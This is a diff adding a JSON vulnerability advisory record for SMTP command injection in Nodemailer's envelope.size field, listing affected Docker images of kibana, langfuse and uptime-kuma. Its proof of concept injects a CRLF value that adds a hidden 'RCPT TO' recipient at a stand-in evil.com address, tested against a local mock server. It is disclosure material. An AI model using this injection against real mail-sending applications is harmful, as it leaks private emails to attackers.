@@ -1,0 +1,333 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-2fc6-wi6y-ihh7-owgw",
+  "modified": "2026-10-26T00:00:53Z",
+  "published": "2026-10-26T00:00:53Z",
+  "upstream": [
+    "GHSA-c7w3-x93f-qmm8"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\nWhen a custom `envelope` object is passed to `sendMail()` with a `size` property containing CRLF characters (`\\r\\n`), the value is concatenated directly into the SMTP `MAIL FROM` command without sanitization. This allows injection of arbitrary SMTP commands, including `RCPT TO` — silently adding attacker-controlled recipients to outgoing emails.\n\n\n### Details\nIn `lib/smtp-connection/index.js` (lines 1161-1162), the `envelope.size` value is concatenated into the SMTP `MAIL FROM` command without any CRLF sanitization:\n\n```javascript\nif (this._envelope.size && this._supportedExtensions.includes('SIZE')) {\n    args.push('SIZE=' + this._envelope.size);\n}\n```\n\nThis contrasts with other envelope parameters in the same function that ARE properly sanitized:\n- **Addresses** (`from`, `to`): validated for `[\\r\\n<>]` at lines 1107-1127\n- **DSN parameters** (`dsn.ret`, `dsn.envid`, `dsn.orcpt`): encoded via `encodeXText()` at lines 1167-1183\n\nThe `size` property reaches this code path through `MimeNode.setEnvelope()` in `lib/mime-node/index.js` (lines 854-858), which copies all non-standard envelope properties verbatim:\n\n```javascript\nconst standardFields = ['to', 'cc', 'bcc', 'from'];\nObject.keys(envelope).forEach(key => {\n    if (!standardFields.includes(key)) {\n        this._envelope[key] = envelope[key];\n    }\n});\n```\n\nSince `_sendCommand()` writes the command string followed by `\\r\\n` to the raw TCP socket, a CRLF in the `size` value terminates the `MAIL FROM` command and starts a new SMTP command.\n\nNote: by default, Nodemailer constructs the envelope automatically from the message's `from`/`to` fields and does not include `size`. This vulnerability requires the application to explicitly pass a custom `envelope` object with a `size` property to `sendMail()`. \nWhile this limits the attack surface, applications that expose envelope configuration to users are affected.\n\n### PoC\nave the following as `poc.js` and run with `node poc.js`:\n\n```javascript\nconst net = require('net');\nconst nodemailer = require('nodemailer');\n\n// Minimal SMTP server that logs raw commands\nconst server = net.createServer(socket => {\n    socket.write('220 localhost ESMTP\\r\\n');\n    let buffer = '';\n    socket.on('data', chunk => {\n        buffer += chunk.toString();\n        const lines = buffer.split('\\r\\n');\n        buffer = lines.pop();\n        for (const line of lines) {\n            if (!line) continue;\n            console.log('C:', line);\n            if (line.startsWith('EHLO')) {\n                socket.write('250-localhost\\r\\n250-SIZE 10485760\\r\\n250 OK\\r\\n');\n            } else if (line.startsWith('MAIL FROM')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('RCPT TO')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line === 'DATA') {\n                socket.write('354 Start\\r\\n');\n            } else if (line === '.') {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('QUIT')) {\n                socket.write('221 Bye\\r\\n');\n                socket.end();\n            }\n        }\n    });\n});\n\nserver.listen(0, '127.0.0.1', () => {\n    const port = server.address().port;\n    console.log('SMTP server on port', port);\n    console.log('Sending email with injected RCPT TO...\\n');\n\n    const transporter = nodemailer.createTransport({\n        host: '127.0.0.1',\n        port,\n        secure: false,\n        tls: { rejectUnauthorized: false },\n    });\n\n    transporter.sendMail({\n        from: 'sender@example.com',\n        to: 'recipient@example.com',\n        subject: 'Normal email',\n        text: 'This is a normal email.',\n        envelope: {\n            from: 'sender@example.com',\n            to: ['recipient@example.com'],\n            size: '100\\r\\nRCPT TO:<attacker@evil.com>',\n        },\n    }, (err) => {\n        if (err) console.error('Error:', err.message);\n        console.log('\\nExpected output above:');\n        console.log('  C: MAIL FROM:<sender@example.com> SIZE=100');\n        console.log('  C: RCPT TO:<attacker@evil.com>        <-- INJECTED');\n        console.log('  C: RCPT TO:<recipient@example.com>');\n        server.close();\n        transporter.close();\n    });\n});\n```\n\n**Expected output:**\n```\nSMTP server on port 12345\nSending email with injected RCPT TO...\n\nC: EHLO [127.0.0.1]\nC: MAIL FROM:<sender@example.com> SIZE=100\nC: RCPT TO:<attacker@evil.com>\nC: RCPT TO:<recipient@example.com>\nC: DATA\n...\nC: .\nC: QUIT\n```\n\nThe `RCPT TO:<attacker@evil.com>` line is injected by the CRLF in the `size` field, silently adding an extra recipient to the email.\n\n### Impact\nThis is an SMTP command injection vulnerability. An attacker who can influence the `envelope.size` property in a `sendMail()` call can:\n\n- **Silently add hidden recipients** to outgoing emails via injected `RCPT TO` commands, receiving copies of all emails sent through the affected transport\n- **Inject arbitrary SMTP commands** (e.g., `RSET`, additional `MAIL FROM` to send entirely separate emails through the server)\n- **Leverage the sending organization's SMTP server reputation** for spam or phishing delivery\n\nThe severity is mitigated by the fact that the `envelope` object must be explicitly provided by the application. Nodemailer's default envelope construction from message headers does not include `size`. Applications that pass through user-controlled data to the envelope options (e.g., via API parameters, admin panels, or template configurations) are vulnerable.\n\nAffected versions: at least v8.0.3 (current); likely all versions where `envelope.size` is supported.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "9.0.0-debian12",
+        "9.0.1-debian12",
+        "9.0.2-debian12",
+        "9.0.3-debian12",
+        "9.0.4-debian12",
+        "9.0.5-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "9.0.5-debian13",
+        "9.0.6-debian13",
+        "9.0.7-debian13",
+        "9.0.8-debian13",
+        "9.1.10-debian13",
+        "9.1.2-debian13",
+        "9.1.3-debian13",
+        "9.1.4-debian13",
+        "9.1.5-debian13",
+        "9.1.6-debian13",
+        "9.1.7-debian13",
+        "9.1.8-debian13",
+        "9.1.9-debian13",
+        "9.2.0-debian13",
+        "9.2.1-debian13",
+        "9.2.2-debian13",
+        "9.2.3-debian13",
+        "9.2.4-debian13",
+        "9.2.5-debian13",
+        "9.2.6-debian13",
+        "9.2.8-debian13",
+        "9.3.0-debian13",
+        "9.3.1-debian13",
+        "9.3.3-debian13",
+        "9.3.4-debian13",
+        "9.4.1-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "langfuse-worker",
+        "purl": "pkg:docker/dhi/langfuse-worker?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "2.95.12-debian13",
+        "2.95.12-debian13-dev",
+        "2.95.12-debian13-fips",
+        "2.95.12-debian13-fips-dev",
+        "3.187.0-debian13",
+        "3.187.0-debian13-dev",
+        "3.187.0-debian13-fips",
+        "3.187.0-debian13-fips-dev",
+        "3.188.0-debian13",
+        "3.188.0-debian13-dev",
+        "3.188.0-debian13-fips",
+        "3.188.0-debian13-fips-dev",
+        "3.191.0-debian13",
+        "3.191.0-debian13-dev",
+        "3.191.0-debian13-fips",
+        "3.191.0-debian13-fips-dev",
+        "3.193.0-debian13",
+        "3.193.0-debian13-dev",
+        "3.193.0-debian13-fips",
+        "3.193.0-debian13-fips-dev",
+        "3.194.0-debian13",
+        "3.194.0-debian13-dev",
+        "3.194.0-debian13-fips",
+        "3.194.0-debian13-fips-dev",
+        "3.194.1-debian13",
+        "3.194.1-debian13-dev",
+        "3.194.1-debian13-fips",
+        "3.194.1-debian13-fips-dev",
+        "3.195.0-debian13",
+        "3.195.0-debian13-dev",
+        "3.195.0-debian13-fips",
+        "3.195.0-debian13-fips-dev",
+        "3.197.1-debian13",
+        "3.197.1-debian13-dev",
+        "3.197.1-debian13-fips",
+        "3.197.1-debian13-fips-dev",
+        "3.198.0-debian13",
+        "3.198.0-debian13-dev",
+        "3.198.0-debian13-fips",
+        "3.198.0-debian13-fips-dev",
+        "3.200.0-debian13",
+        "3.200.0-debian13-dev",
+        "3.200.0-debian13-fips",
+        "3.200.0-debian13-fips-dev",
+        "3.201.1-debian13",
+        "3.201.1-debian13-dev",
+        "3.201.1-debian13-fips",
+        "3.201.1-debian13-fips-dev",
+        "3.202.1-debian13",
+        "3.202.1-debian13-dev",
+        "3.202.1-debian13-fips",
+        "3.202.1-debian13-fips-dev",
+        "3.203.1-debian13",
+        "3.203.1-debian13-dev",
+        "3.203.1-debian13-fips",
+        "3.203.1-debian13-fips-dev",
+        "3.203.3-debian13",
+        "3.203.3-debian13-dev",
+        "3.203.3-debian13-fips",
+        "3.203.3-debian13-fips-dev",
+        "3.204.0-debian13",
+        "3.204.0-debian13-dev",
+        "3.204.0-debian13-fips",
+        "3.204.0-debian13-fips-dev",
+        "3.205.0-debian13",
+        "3.205.0-debian13-dev",
+        "3.205.0-debian13-fips",
+        "3.205.0-debian13-fips-dev",
+        "3.205.1-debian13",
+        "3.205.1-debian13-dev",
+        "3.205.1-debian13-fips",
+        "3.205.1-debian13-fips-dev",
+        "3.206.0-debian13",
+        "3.206.0-debian13-dev",
+        "3.206.0-debian13-fips",
+        "3.206.0-debian13-fips-dev",
+        "3.208.0-debian13",
+        "3.208.0-debian13-dev",
+        "3.208.0-debian13-fips",
+        "3.208.0-debian13-fips-dev",
+        "3.210.0-debian13",
+        "3.210.0-debian13-dev",
+        "3.210.0-debian13-fips",
+        "3.210.0-debian13-fips-dev",
+        "3.212.0-debian13",
+        "3.212.0-debian13-dev",
+        "3.212.0-debian13-fips",
+        "3.212.0-debian13-fips-dev",
+        "3.213.0-debian13",
+        "3.213.0-debian13-dev",
+        "3.213.0-debian13-fips",
+        "3.213.0-debian13-fips-dev",
+        "3.214.0-debian13",
+        "3.214.0-debian13-dev",
+        "3.214.0-debian13-fips",
+        "3.214.0-debian13-fips-dev",
+        "3.216.0-debian13",
+        "3.216.0-debian13-dev",
+        "3.216.0-debian13-fips",
+        "3.216.0-debian13-fips-dev",
+        "3.218.0-debian13",
+        "3.218.0-debian13-dev",
+        "3.218.0-debian13-fips",
+        "3.218.0-debian13-fips-dev",
+        "3.219.0-debian13",
+        "3.219.0-debian13-dev",
+        "3.219.0-debian13-fips",
+        "3.219.0-debian13-fips-dev",
+        "3.221.1-debian13",
+        "3.221.1-debian13-dev",
+        "3.221.1-debian13-fips",
+        "3.221.1-debian13-fips-dev",
+        "3.222.0-debian13",
+        "3.222.0-debian13-dev",
+        "3.222.0-debian13-fips",
+        "3.222.0-debian13-fips-dev",
+        "3.223.0-debian13",
+        "3.223.0-debian13-dev",
+        "3.223.0-debian13-fips",
+        "3.223.0-debian13-fips-dev",
+        "3.224.0-debian13",
+        "3.224.0-debian13-dev",
+        "3.224.0-debian13-fips",
+        "3.224.0-debian13-fips-dev",
+        "3.224.1-debian13",
+        "3.224.1-debian13-dev",
+        "3.224.1-debian13-fips",
+        "3.224.1-debian13-fips-dev",
+        "3.224.2-debian13",
+        "3.224.2-debian13-dev",
+        "3.224.2-debian13-fips",
+        "3.224.2-debian13-fips-dev",
+        "3.224.3-debian13",
+        "3.224.3-debian13-dev",
+        "3.224.3-debian13-fips",
+        "3.224.3-debian13-fips-dev",
+        "3.225.0-debian13",
+        "3.225.0-debian13-dev",
+        "3.225.0-debian13-fips",
+        "3.225.0-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "langfuse",
+        "purl": "pkg:docker/dhi/langfuse?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "3.178.0-debian13",
+        "3.178.0-debian13-dev",
+        "3.178.0-debian13-fips",
+        "3.178.0-debian13-fips-dev",
+        "3.183.0-debian13",
+        "3.183.0-debian13-dev",
+        "3.183.0-debian13-fips",
+        "3.183.0-debian13-fips-dev",
+        "3.184.0-debian13",
+        "3.184.0-debian13-dev",
+        "3.184.0-debian13-fips",
+        "3.184.0-debian13-fips-dev",
+        "3.184.1-debian13",
+        "3.184.1-debian13-dev",
+        "3.184.1-debian13-fips",
+        "3.184.1-debian13-fips-dev",
+        "3.185.0-debian13",
+        "3.185.0-debian13-dev",
+        "3.185.0-debian13-fips",
+        "3.185.0-debian13-fips-dev",
+        "3.186.0-debian13",
+        "3.186.0-debian13-dev",
+        "3.186.0-debian13-fips",
+        "3.186.0-debian13-fips-dev",
+        "3.187.0-debian13",
+        "3.187.0-debian13-dev",
+        "3.187.0-debian13-fips",
+        "3.187.0-debian13-fips-dev",
+        "3.188.0-debian13",
+        "3.188.0-debian13-dev",
+        "3.188.0-debian13-fips",
+        "3.188.0-debian13-fips-dev",
+        "3.194.0-debian13",
+        "3.194.0-debian13-dev",
+        "3.194.0-debian13-fips",
+        "3.194.0-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "uptime-kuma",
+        "purl": "pkg:docker/dhi/uptime-kuma?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.23.16-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "uptime-kuma",
+        "purl": "pkg:docker/dhi/uptime-kuma?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.23.16-debian13",
+        "1.23.17-debian13",
+        "1.23.17-debian13-dev",
+        "2.0.2-debian13",
+        "2.0.2-debian13-dev",
+        "2.1.0-debian13",
+        "2.1.0-debian13-dev",
+        "2.1.1-debian13",
+        "2.1.1-debian13-dev",
+        "2.1.3-debian13",
+        "2.1.3-debian13-dev",
+        "2.2.0-debian13",
+        "2.2.0-debian13-dev",
+        "2.2.1-debian13",
+        "2.2.1-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-2fc6-wi6y-ihh7-owgw"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-c7w3-x93f-qmm8"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651"
+    }
+  ]
+}
